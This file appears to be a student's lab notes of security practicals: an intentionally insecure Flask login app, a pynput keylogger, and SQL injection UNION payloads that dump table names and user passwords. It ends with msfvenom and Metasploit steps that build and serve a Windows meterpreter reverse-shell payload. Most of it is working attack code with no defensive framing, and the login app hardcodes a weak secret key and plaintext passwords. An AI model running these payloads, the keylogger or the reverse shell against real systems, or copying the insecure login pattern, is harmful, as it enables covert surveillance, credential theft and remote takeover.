'''from flask import Flask,request,session,redirect,url_for
app=Flask(__name__)
app.secret_key="weakkey"
users={
    "admin":"admin123",
    "guest":"guest123"
    }
@app.route("/",methods=["GET","POST"])
def login():
    if request.method=="POST":
        username=request.form.get("username")
        password=request.form.get("password")

        if username in users and users[username] == password:
            session["user"]=username
            return redirect("/welcome")
        return '<h3>invalid login><a href="/">Try Again</a>'

    return '''
        <h2>Login</h2>
        <form method="POST">
            Username:<input type="text" name="username"><br><br>
            Password:<input typ="password" name="password"><br><br>
            <button type="submit">Login</button>
        </form>
        '''

@app.route("/welcome")
def welcome():
    if "user" not in session:
        return redirect(url_for("login"))
    
    return f'''
    <h2>Welcome, {session["user"]}!</h2>
    <a href="/logout">Logout</a>
    '''
@app.route("/logout")
def logout():
    session.pop("user",None)
    return redirect(url_for("login"))
if __name__=="__main__":
    app.run(debug=True)
'''





'''
from pynput.keyboard import Key,Listener
import logging
log_dir=""
logging.basicConfig(filename=(log_dir+'my.txt'),level=logging.DEBUG,
                    format='%(asctime)s:%(message)s')
def on_press(key):
    logging.info(str(key))
with Listener(on_press=on_press) as Listener:
    Listener.join()
'''




'''
#pr.8
1' union select 1,table_name from information_schema.tables-- -
1' union select 1,column_name from information_schema.columns where table_name=char(104, 111,115, 116)-- -
1' union select user,password from users-- -
'''


'''
#pr.10
in linux,

ifconfig
password: kali
sudo su
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.235.128 LPORT=123 -f exe -o payload.exe
ls
mv payload.exe /var/www/html
service apache2 start
sudo msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.153.131
run  (run on base machine or sem, 5-6 192.168.153.131/payload.exe)
systeminfo
exit
'''

